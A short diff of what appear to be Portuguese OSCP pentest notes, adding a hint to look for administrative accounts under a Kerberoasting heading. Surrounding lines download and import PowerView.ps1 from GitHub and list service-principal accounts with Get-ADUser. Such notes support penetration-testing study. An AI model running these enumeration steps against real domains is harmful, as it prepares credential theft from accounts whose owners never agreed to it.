@@ -254,6 +254,7 @@ curl https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1  -Outfile PowerVie
 import-module .\PowerView.ps1
 ```
 ##### KERBEROASTING - FIND SPN
+PROCURE POR CONTAS COM PERMISSÕES ADMINISTRATIVAS, EM GRUPOS COM PERMISSÕES ADMINISTRATIVAS
 ```
 Get-ADUSer -Filter { ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | select SamAccountName, ServicePrincipalName
 $FormatEnumerationLimit=-1
